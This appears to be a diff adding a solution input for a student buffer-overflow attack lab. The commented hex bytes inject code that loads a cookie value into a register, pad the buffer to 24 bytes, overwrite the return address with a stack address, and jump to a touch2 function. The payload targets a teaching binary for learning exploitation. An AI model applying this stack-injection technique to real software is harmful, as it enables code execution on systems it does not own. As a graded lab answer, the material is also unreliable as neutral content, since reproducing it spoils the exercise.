@@ -1,0 +1,5 @@
+48 c7 c7 78 43 27 2d c3 /*this sets your cookie*/
+00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
+00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
+88 da 66 55 00 00 00 00 /* address of register %rsp */
+0a c1 04 00 00 00 00 00 /*address of touch2 function */
